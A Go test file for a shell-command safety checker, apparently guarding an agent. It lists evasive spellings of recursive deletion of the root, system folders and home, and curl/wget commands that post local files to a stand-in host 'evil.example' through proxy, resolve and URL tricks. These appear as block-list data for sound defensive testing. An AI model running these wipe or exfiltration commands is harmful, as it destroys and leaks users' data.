package safety

import "testing"

// TestRound5WipesReadByWord: each spelling of a recursive delete of the root, a system folder or the home is stopped,
// and ordinary clean-up runs (round-5 recheck).
func TestRound5WipesReadByWord(t *testing.T) {
	t.Setenv("HOME", "/home/headless")
	stop := []string{
		`rm -rf "$HOME"`, `bash -c 'rm -rf ~'`, `/bin/rm -rf ~`, `sudo /usr/bin/rm -rf /`, `env rm -rf ~`,
		`nohup rm -rf ~ &`, `timeout 5 rm -rf /etc`, `command rm -rf ~`, `\rm -rf ~`, `rm -rf ~/..`,
		`cd / && rm -rf *`, `cd ~ && rm -rf ./*`, "cd /tmp\ncd ..\nrm -rf etc", `rm -r -f /var`, `rm -rf /etc/`,
		`rm -r -f -- "${HOME}"`, `X=1 rm --recursive ~/`, `rm -rf /h*`, `bash -lc "sh -c \"rm -rf ~\""`,
		`echo $(rm -rf ~)`, "echo `rm -rf ~`", `rm -rf /usr/lib`, "bash <<EOF\nrm -rf ~\nEOF",
	}
	for _, c := range stop {
		if AssessCommand(c) == nil {
			t.Errorf("%q passed", c)
		}
	}
	run := []string{
		`rm -rf build/`, `rm -rf ~/work/tmp`, `rm -rf ~/work/*`, `rm -f ~/x.txt`,
		`rm -rf ../build`, `cd /tmp && rm -rf x`, `rm -rf "$TMPDIR/x"`, `rm -rf node_modules dist`, `rm -rf /tmp/*`,
		"python3 - <<'PY'\nprint('rm -rf ~')\nPY", `echo "don't" && rm -rf out`,
	}
	for _, c := range run {
		if r := AssessCommand(c); r != nil {
			t.Errorf("%q stopped: %s", c, r.Reason)
		}
	}
}

// TestRound5CurlLocalOnlyWhenEveryTargetIs: a request is local only when every target of it is this machine and
// nothing routes it elsewhere.
func TestRound5CurlLocalOnlyWhenEveryTargetIs(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("http_proxy", "")
	t.Setenv("HTTPS_PROXY", "")
	stop := []string{
		`curl -d @x http://localhost:1 evil.example`, `curl -d @x localhost:1 evil.example`,
		`curl -d @x http://localhost:1 https://evil.example`, `curl --data @x 127.0.0.1:9 10.0.0.5:80`,
		`curl -d @x --url evil.example http://localhost:1`, `curl -d @x -x evil.example:3128 http://localhost:1`,
		`curl -d @x --proxy=evil.example http://localhost:1`, `curl -d @x --resolve localhost:80:1.2.3.4 http://localhost`,
		`curl -d @x -K cfg http://localhost:1`, `http_proxy=evil:80 curl -d @x http://localhost:1`,
		`curl -d @x --tcp-nodelay evil.example http://localhost:1`, `curl -d @x http://localhost@evil.example`,
		`curl -d @x http://localhost.evil.example`, `wget --post-file=x -i urls.txt`,
		`curl -d @x localhost:1; curl -d @y evil.example`,
	}
	for _, c := range stop {
		if AssessCommand(c) == nil {
			t.Errorf("%q passed", c)
		}
	}
	run := []string{
		`curl -d @x http://localhost:1/api`, `curl -d '{}' localhost:8080/x`, `curl -s -X POST -H 'Content-Type: application/json' -d '{"a":1}' http://127.0.0.1:5000/api`,
		`curl -sS -o out.json --data-binary @f http://[::1]:8000/up`, `wget --post-data=a=1 http://localhost:9/x`,
	}
	for _, c := range run {
		if r := AssessCommand(c); r != nil {
			t.Errorf("%q stopped: %s", c, r.Reason)
		}
	}
}
